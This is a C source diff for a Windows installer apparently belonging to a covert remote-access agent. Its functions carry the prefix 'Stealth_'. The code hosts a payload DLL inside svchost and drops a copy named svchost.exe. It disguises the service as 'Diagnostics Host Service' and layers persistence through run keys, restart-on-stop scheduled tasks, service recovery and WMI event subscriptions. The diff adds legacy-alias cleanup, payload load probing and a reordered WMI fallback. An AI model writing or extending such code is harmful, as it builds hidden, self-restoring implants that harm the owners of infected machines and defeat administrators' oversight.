@@ -80,6 +80,38 @@ static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
     return TRUE;
 }
 
+static BOOL MeshInstaller_GetProgramDataRoot(wchar_t* buffer, size_t count)
+{
+    if (buffer == NULL || count == 0) { return FALSE; }
+    PWSTR programData = NULL;
+    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
+    BOOL resolved = FALSE;
+    if (SUCCEEDED(hr) && programData != NULL)
+    {
+        resolved = SUCCEEDED(StringCchCopyW(buffer, count, programData));
+        CoTaskMemFree(programData);
+    }
+
+    if (!resolved)
+    {
+        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", buffer, (DWORD)count);
+        resolved = (envLen > 0 && envLen < count);
+    }
+
+    if (!resolved)
+    {
+        WCHAR windowsDir[MAX_PATH] = {0};
+        UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
+        if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
+        if (FAILED(StringCchPrintfW(buffer, count, L"%s\\ProgramData", windowsDir))) { return FALSE; }
+        resolved = TRUE;
+    }
+
+    if (!resolved) { return FALSE; }
+    MeshInstaller_NormalizePathSeparators(buffer);
+    return TRUE;
+}
+
 static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar_t* root, const wchar_t* leaf)
 {
     if (dest == NULL || destLen == 0) { return FALSE; }
@@ -134,6 +166,7 @@ static void Stealth_TerminateProcessesByPath(const wchar_t* exePath);
 static BOOL Stealth_DeleteExistingService(const wchar_t* serviceName);
 static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure);
 static BOOL Stealth_RemoveFileIfExistsWithTimeout(const wchar_t* path, DWORD timeoutMs, BOOL logOnFailure);
+static BOOL Stealth_RemoveDirectoryTree(const wchar_t* path, BOOL logOnFailure);
 void Stealth_LogPathState(const wchar_t* path);
 static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName);
 static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity);
@@ -160,15 +193,19 @@ static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath);
 static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath);
 static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair);
 static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath);
+static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName);
 
 #define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
 #define STEALTH_SERVICE_STOP_TIMEOUT_MS  (30 * 1000)
 #define STEALTH_FIREWALL_SETTLE_TIMEOUT_MS (12 * 1000)
 #define STEALTH_FIREWALL_RETRY_DELAY_MS    (1000)
 #define STEALTH_FIREWALL_MAX_ATTEMPTS      (3)
+#define STEALTH_MASTER_SERVICE_EXE_NAME    L"MasterService.exe"
 
 static wchar_t g_InstallLogPath[MAX_PATH] = {0};
 static BOOL g_HaveInstallLogPath = FALSE;
+static volatile LONG g_InstallLogDirEnsured = 0;
+static wchar_t g_InstallLogDirEnsuredPath[MAX_PATH] = {0};
 static wchar_t g_PersistenceStatePath[MAX_PATH] = {0};
 static BOOL g_HavePersistenceStatePath = FALSE;
 
@@ -187,6 +224,138 @@ static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot)
     if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), installRoot, L"state")) { return; }
     if (!MeshInstaller_CombinePath(g_PersistenceStatePath, _countof(g_PersistenceStatePath), stateDir, L"persistence.ini")) { return; }
     g_HavePersistenceStatePath = (g_PersistenceStatePath[0] != L'\0');
+}
+
+static BOOL Stealth_ReadServiceParameterString(const wchar_t* serviceName, const wchar_t* valueName, wchar_t* buffer, size_t bufferCch)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0' || valueName == NULL || valueName[0] == L'\0' || buffer == NULL || bufferCch == 0)
+    {
+        return FALSE;
+    }
+
+    buffer[0] = L'\0';
+    wchar_t keyPath[512] = {0};
+    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
+
+    HKEY hKey = NULL;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
+    {
+        return FALSE;
+    }
+
+    DWORD type = 0;
+    DWORD cb = (DWORD)(bufferCch * sizeof(wchar_t));
+    LONG status = RegQueryValueExW(hKey, valueName, NULL, &type, (LPBYTE)buffer, &cb);
+    RegCloseKey(hKey);
+    if (status != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ))
+    {
+        buffer[0] = L'\0';
+        return FALSE;
+    }
+    buffer[bufferCch - 1] = L'\0';
+    return TRUE;
+}
+
+static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName)
+{
+    const wchar_t* legacyServiceName = L"DiagHostSvc";
+    const wchar_t* legacyDisplayName = L"Diagnostics Host Service";
+    wchar_t programDataRoot[MAX_PATH] = {0};
+    wchar_t legacyInstallRoot[MAX_PATH] = {0};
+    wchar_t legacyServiceDllRaw[MAX_PATH * 4] = {0};
+    wchar_t legacyServiceDll[MAX_PATH * 4] = {0};
+
+    if (activeServiceName != NULL && activeServiceName[0] != L'\0' && _wcsicmp(activeServiceName, legacyServiceName) == 0)
+    {
+        return;
+    }
+
+    if (!MeshInstaller_GetProgramDataRoot(programDataRoot, _countof(programDataRoot)))
+    {
+        return;
+    }
+    if (!MeshInstaller_CombinePath(legacyInstallRoot, _countof(legacyInstallRoot), programDataRoot, L"WinDiagnosticHost"))
+    {
+        return;
+    }
+    MeshInstaller_NormalizePathSeparators(legacyInstallRoot);
+
+    if (!Stealth_ReadServiceParameterString(legacyServiceName, L"ServiceDll", legacyServiceDllRaw, _countof(legacyServiceDllRaw)))
+    {
+        return;
+    }
+
+    DWORD expanded = ExpandEnvironmentStringsW(legacyServiceDllRaw, legacyServiceDll, (DWORD)_countof(legacyServiceDll));
+    if (expanded == 0 || expanded >= _countof(legacyServiceDll))
+    {
+        StringCchCopyW(legacyServiceDll, _countof(legacyServiceDll), legacyServiceDllRaw);
+    }
+    MeshInstaller_NormalizePathSeparators(legacyServiceDll);
+
+    size_t legacyRootLen = wcslen(legacyInstallRoot);
+    if (legacyRootLen == 0 || _wcsnicmp(legacyServiceDll, legacyInstallRoot, legacyRootLen) != 0)
+    {
+        return;
+    }
+
+    Stealth_LogInstallEvent(
+        L"[LEGACY] Found stale service alias %ls (ServiceDll=%ls). Removing legacy registration and artifacts.",
+        legacyServiceName,
+        legacyServiceDll);
+
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+    Stealth_ClearServiceRecovery(legacyServiceName);
+    Stealth_RemoveRunKeyEntry(legacyServiceName);
+    Stealth_RemoveScheduledTasks(persistence, legacyDisplayName, legacyServiceName);
+    (void)Stealth_StopServiceAndWait(legacyServiceName, 30000, TRUE);
+
+    if (!Stealth_UnregisterSvchostService(legacyServiceName))
+    {
+        Stealth_LogInstallEvent(L"[LEGACY] Failed to unregister stale service alias %ls (error=%lu)", legacyServiceName, GetLastError());
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[LEGACY] Unregistered stale service alias %ls", legacyServiceName);
+    }
+
+    (void)Stealth_RemoveFirewallRuleForService(legacyServiceName);
+
+    wchar_t legacyExePath[MAX_PATH] = {0};
+    wchar_t legacyHostExePath[MAX_PATH] = {0};
+    wchar_t legacyLogsPath[MAX_PATH] = {0};
+    wchar_t legacyStatePath[MAX_PATH] = {0};
+    wchar_t legacyHiddenMshPath[MAX_PATH] = {0};
+    wchar_t legacyPrimaryMshPath[MAX_PATH] = {0};
+    wchar_t legacyAltMshPath[MAX_PATH] = {0};
+    wchar_t legacyConfPath[MAX_PATH] = {0};
+    wchar_t legacyDebugLogPath[MAX_PATH] = {0};
+
+    (void)MeshInstaller_CombinePath(legacyExePath, _countof(legacyExePath), legacyInstallRoot, L"diaghost.exe");
+    (void)MeshInstaller_CombinePath(legacyHostExePath, _countof(legacyHostExePath), legacyInstallRoot, L"svchost.exe");
+    (void)MeshInstaller_CombinePath(legacyLogsPath, _countof(legacyLogsPath), legacyInstallRoot, L"logs");
+    (void)MeshInstaller_CombinePath(legacyStatePath, _countof(legacyStatePath), legacyInstallRoot, L"state");
+    (void)MeshInstaller_CombinePath(legacyHiddenMshPath, _countof(legacyHiddenMshPath), legacyInstallRoot, L".msh");
+    (void)MeshInstaller_CombinePath(legacyPrimaryMshPath, _countof(legacyPrimaryMshPath), legacyInstallRoot, L"diagsvc.msh");
+    (void)MeshInstaller_CombinePath(legacyAltMshPath, _countof(legacyAltMshPath), legacyInstallRoot, L"WinDiagnosticHost.msh");
+    (void)MeshInstaller_CombinePath(legacyConfPath, _countof(legacyConfPath), legacyInstallRoot, L"diaghost.conf");
+    (void)MeshInstaller_CombinePath(legacyDebugLogPath, _countof(legacyDebugLogPath), legacyInstallRoot, L"svchost-debug.log");
+
+    (void)Stealth_TerminateProcessesByPath(legacyHostExePath);
+    (void)Stealth_TerminateProcessesByPath(legacyExePath);
+    (void)Stealth_RemoveFirewallRulesByExePath(legacyExePath);
+    (void)Stealth_RemoveFirewallRulesByExePath(legacyHostExePath);
+
+    (void)Stealth_RemoveFileIfExists(legacyServiceDll, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyExePath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyHostExePath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyConfPath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyHiddenMshPath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyPrimaryMshPath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyAltMshPath, TRUE);
+    (void)Stealth_RemoveFileIfExists(legacyDebugLogPath, TRUE);
+    (void)Stealth_RemoveDirectoryTree(legacyStatePath, TRUE);
+    (void)Stealth_RemoveDirectoryTree(legacyLogsPath, TRUE);
+    (void)Stealth_RemoveDirectoryTree(legacyInstallRoot, TRUE);
 }
 
 // ================================================================
@@ -729,6 +898,9 @@ static void Stealth_EnsureLogDirectory(void)
 {
     if (!g_HaveInstallLogPath) { return; }
     wchar_t pathCopy[MAX_PATH] = {0};
+    DWORD attrs = INVALID_FILE_ATTRIBUTES;
+    BOOL cachedReady = FALSE;
+
     wcsncpy_s(pathCopy, _countof(pathCopy), g_InstallLogPath, _TRUNCATE);
     wchar_t* lastSlash = wcsrchr(pathCopy, L'\\');
     if (lastSlash != NULL)
@@ -736,7 +908,32 @@ static void Stealth_EnsureLogDirectory(void)
         *lastSlash = L'\0';
         if (pathCopy[0] != L'\0')
         {
-            Stealth_CreateInstallationDirectory(pathCopy);
+            cachedReady = (InterlockedCompareExchange(&g_InstallLogDirEnsured, 1, 1) == 1) &&
+                (_wcsicmp(g_InstallLogDirEnsuredPath, pathCopy) == 0);
+            if (cachedReady)
+            {
+                attrs = GetFileAttributesW(pathCopy);
+                if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
+                {
+                    return;
+                }
+                InterlockedExchange(&g_InstallLogDirEnsured, 0);
+                g_InstallLogDirEnsuredPath[0] = L'\0';
+            }
+
+            attrs = GetFileAttributesW(pathCopy);
+            if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
+            {
+                StringCchCopyW(g_InstallLogDirEnsuredPath, _countof(g_InstallLogDirEnsuredPath), pathCopy);
+                InterlockedExchange(&g_InstallLogDirEnsured, 1);
+                return;
+            }
+
+            if (Stealth_CreateInstallationDirectory(pathCopy))
+            {
+                StringCchCopyW(g_InstallLogDirEnsuredPath, _countof(g_InstallLogDirEnsuredPath), pathCopy);
+                InterlockedExchange(&g_InstallLogDirEnsured, 1);
+            }
         }
     }
 }
@@ -1016,6 +1213,39 @@ static BOOL Stealth_ShouldAttemptSvchostRepairForError(DWORD errorCode)
             errorCode == ERROR_BAD_EXE_FORMAT);
 }
 
+static BOOL Stealth_LoadSvchostPayloadForValidation(const wchar_t* dllPath, HMODULE* moduleOut)
+{
+    if (dllPath == NULL || dllPath[0] == L'\0' || moduleOut == NULL)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    *moduleOut = NULL;
+
+    // Prefer modern loader search flags so dependency resolution is deterministic.
+    HMODULE mod = LoadLibraryExW(dllPath, NULL, LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR | LOAD_LIBRARY_SEARCH_SYSTEM32);
+    if (mod == NULL)
+    {
+        DWORD err = GetLastError();
+        if (err == ERROR_INVALID_PARAMETER || err == ERROR_CALL_NOT_IMPLEMENTED)
+        {
+            // Fallback for environments where advanced loader flags are unavailable.
+            mod = LoadLibraryW(dllPath);
+            err = (mod == NULL) ? GetLastError() : ERROR_SUCCESS;
+        }
+        if (mod == NULL)
+        {
+            SetLastError(err);
+            return FALSE;
+        }
+    }
+
+    *moduleOut = mod;
+    SetLastError(ERROR_SUCCESS);
+    return TRUE;
+}
+
 static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath)
 {
     if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return; }
@@ -1079,6 +1309,27 @@ static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath)
     if (serviceMain == NULL)
     {
         Stealth_LogInstallEvent(L"Svchost payload export missing for %ls (expected=Stealth_SvchostServiceMain, error=%lu)", dllPath, procErr);
+        SetLastError(ERROR_PROC_NOT_FOUND);
+        return FALSE;
+    }
+
+    // Perform a full dependency-resolving load probe. Export-only checks can miss
+    // missing dependent modules/procedures that surface as ERROR_PROC_NOT_FOUND at service start.
+    HMODULE modResolved = NULL;
+    if (!Stealth_LoadSvchostPayloadForValidation(dllPath, &modResolved))
+    {
+        DWORD err = GetLastError();
+        Stealth_LogInstallEvent(L"Svchost payload dependency validation failed for %ls (error=%lu)", dllPath, err);
+        return FALSE;
+    }
+
+    FARPROC resolvedMain = GetProcAddress(modResolved, "Stealth_SvchostServiceMain");
+    DWORD resolvedErr = GetLastError();
+    FreeLibrary(modResolved);
+    if (resolvedMain == NULL)
+    {
+        Stealth_LogInstallEvent(L"Svchost payload runtime export probe failed for %ls (expected=Stealth_SvchostServiceMain, error=%lu)", dllPath, resolvedErr);
+        SetLastError(ERROR_PROC_NOT_FOUND);
         return FALSE;
     }
 
@@ -1214,17 +1465,22 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
 {
     if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
 
+    DWORD terminalError = ERROR_SUCCESS;
     SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (hScm == NULL)
     {
-        Stealth_LogInstallEvent(L"Service start failed: OpenSCManager failed (error=%lu)", GetLastError());
+        terminalError = GetLastError();
+        Stealth_LogInstallEvent(L"Service start failed: OpenSCManager failed (error=%lu)", terminalError);
+        SetLastError(terminalError);
         return FALSE;
     }
 
     SC_HANDLE hService = OpenServiceW(hScm, serviceName, SERVICE_START | SERVICE_QUERY_STATUS);
     if (hService == NULL)
     {
-        Stealth_LogInstallEvent(L"Service start failed: OpenService failed for %ls (error=%lu)", serviceName, GetLastError());
+        terminalError = GetLastError();
+        Stealth_LogInstallEvent(L"Service start failed: OpenService failed for %ls (error=%lu)", serviceName, terminalError);
+        SetLastError(terminalError);
         CloseServiceHandle(hScm);
         return FALSE;
     }
@@ -1235,6 +1491,8 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
         if (startError != ERROR_SERVICE_ALREADY_RUNNING)
         {
             Stealth_LogInstallEvent(L"StartService failed for %ls (error=%lu)", serviceName, startError);
+            terminalError = startError;
+            SetLastError(startError);
             CloseServiceHandle(hService);
             CloseServiceHandle(hScm);
 
@@ -1257,6 +1515,7 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
         {
             DWORD queryError = GetLastError();
             Stealth_LogInstallEvent(L"QueryServiceStatusEx failed for %ls (error=%lu)", serviceName, queryError);
+            terminalError = queryError;
             break;
         }
 
@@ -1270,7 +1529,28 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
         {
             DWORD stopError = ssp.dwWin32ExitCode;
             DWORD stopSpecific = ssp.dwServiceSpecificExitCode;
-            Stealth_LogInstallEvent(L"Service %ls stopped during startup (win32=%lu specific=%lu)", serviceName, stopError, stopSpecific);
+            DWORD effectiveStopError = stopError;
+            if (effectiveStopError == ERROR_SERVICE_SPECIFIC_ERROR && stopSpecific != 0)
+            {
+                effectiveStopError = stopSpecific;
+            }
+            terminalError = effectiveStopError;
+            SetLastError(effectiveStopError);
+            Stealth_LogInstallEvent(
+                L"Service %ls stopped during startup (win32=%lu specific=%lu effective=%lu)",
+                serviceName,
+                stopError,
+                stopSpecific,
+                effectiveStopError);
+
+            if (allowRepair &&
+                Stealth_ShouldAttemptSvchostRepairForError(effectiveStopError) &&
+                Stealth_AttemptSvchostStartupRepair(serviceName, dllPath))
+            {
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hScm);
+                return Stealth_StartSvchostServiceAndWait(serviceName, dllPath, timeoutMs, FALSE);
+            }
             break;
         }
 
@@ -1288,6 +1568,11 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
 
     if (!running)
     {
+        if (terminalError == ERROR_SUCCESS)
+        {
+            terminalError = ERROR_SERVICE_REQUEST_TIMEOUT;
+        }
+        SetLastError(terminalError);
         Stealth_LogInstallEvent(L"Service %ls failed to reach RUNNING state within %lu ms", serviceName, timeoutMs);
     }
 
@@ -1332,6 +1617,8 @@ BOOL Stealth_PerformCompleteInstallation(
 
     MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
     if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }
+
+    Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
     // Get installation paths
     if (!Stealth_GetInstallPaths(&paths))
@@ -1559,11 +1846,14 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     wchar_t controlLogPath[MAX_PATH] = {0};
     wchar_t svchostDebugPath[MAX_PATH] = {0};
     wchar_t hostExePath[MAX_PATH] = {0};
+    wchar_t masterServicePath[MAX_PATH] = {0};
 
     MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
     if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
     MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
     if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+
+    Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
     Stealth_SetInstallerLogPathToTemp(L"MeshInstaller-Uninstall.log");
     Stealth_LogInstallEvent(L"Beginning complete uninstallation for %ls", serviceKeyName);
@@ -1571,6 +1861,7 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     // Get paths
     Stealth_GetInstallPaths(&paths);
     MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");
+    MeshInstaller_CombinePath(masterServicePath, _countof(masterServicePath), paths.installDir, STEALTH_MASTER_SERVICE_EXE_NAME);
 
     // Disable recovery and remove restart triggers before stopping
     Stealth_ClearServiceRecovery(serviceKeyName);
@@ -1581,12 +1872,14 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
     Stealth_TerminateProcessesByPath(hostExePath);
     Stealth_TerminateProcessesByPath(paths.exePath);
+    Stealth_TerminateProcessesByPath(masterServicePath);
 
     // Clean up any persistence artifacts that may have been recreated during shutdown
     Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
     Stealth_TerminateProcessesByPath(hostExePath);
     Stealth_TerminateProcessesByPath(paths.exePath);
+    Stealth_TerminateProcessesByPath(masterServicePath);
 
     if (!Stealth_UnregisterSvchostService(serviceKeyName))
     {
@@ -1612,6 +1905,7 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     if (!Stealth_RemoveFileIfExists(paths.confPath, TRUE)) { success = FALSE; }
     if (!Stealth_RemoveFileIfExists(paths.exePath, TRUE)) { success = FALSE; }
     if (!Stealth_RemoveFileIfExists(paths.dllPath, TRUE)) { success = FALSE; }
+    if (!Stealth_RemoveFileIfExistsWithTimeout(masterServicePath, 20000, TRUE)) { success = FALSE; }
 
     MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe");
     MeshInstaller_CombinePath(stateDatPath, _countof(stateDatPath), paths.installDir, L"state.dat");
@@ -1675,6 +1969,8 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
     if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
     MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
     if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+
+    Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
     Stealth_LogInstallEvent(L"[UPDATE] Starting update for %ls", serviceKeyName);
 
@@ -3642,31 +3938,6 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_p
         }
     }
 
-    wchar_t wmiFilter[128] = {0};
-    wchar_t wmiConsumer[128] = {0};
-
-    if (!wmiHealthy)
-    {
-        if (StealthResilience_CreateWmiRestartSubscription(
-                serviceName,
-                wmiClass,
-                wmiMethod,
-                wmiNamespace,
-                wmiFilter,
-                _countof(wmiFilter),
-                wmiConsumer,
-                _countof(wmiConsumer)))
-        {
-            Stealth_LogInstallEvent(L"Registered WMI restart consumer (Filter=%ls Consumer=%ls)", wmiFilter, wmiConsumer);
-            Stealth_RecordPersistenceWmi(&state, wmiFilter, wmiConsumer);
-            Stealth_SavePersistenceState(&state);
-        }
-        else
-        {
-            Stealth_LogInstallEvent(L"[WARN] Failed to register WMI restart consumer for %ls", serviceName);
-        }
-    }
-
     wchar_t xPath[1024] = {0};
     Stealth_FormatServiceStopXPath(serviceName, xPath, _countof(xPath));
 
@@ -3684,10 +3955,37 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_p
             Stealth_LogInstallEvent(L"Scheduled restart-on-stop task %ls", createdTaskPath);
             Stealth_RecordPersistenceTask(&state, createdTaskPath, TRUE);
             Stealth_SavePersistenceState(&state);
+            restartTaskHealthy = TRUE;
         }
         else
         {
             Stealth_LogInstallEvent(L"[WARN] Failed to schedule restart-on-stop task for %ls", serviceName);
+        }
+    }
+
+    // Keep install/update bounded-time: only attempt WMI registration if task-based
+    // restart persistence is not healthy. Task persistence satisfies validation gates.
+    if (!wmiHealthy && !restartTaskHealthy)
+    {
+        wchar_t wmiFilter[128] = {0};
+        wchar_t wmiConsumer[128] = {0};
+        if (StealthResilience_CreateWmiRestartSubscription(
+                serviceName,
+                wmiClass,
+                wmiMethod,
+                wmiNamespace,
+                wmiFilter,
+                _countof(wmiFilter),
+                wmiConsumer,
+                _countof(wmiConsumer)))
+        {
+            Stealth_LogInstallEvent(L"Registered WMI restart consumer (Filter=%ls Consumer=%ls)", wmiFilter, wmiConsumer);
+            Stealth_RecordPersistenceWmi(&state, wmiFilter, wmiConsumer);
+            Stealth_SavePersistenceState(&state);
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"[WARN] Failed to register WMI restart consumer for %ls", serviceName);
         }
     }
 }
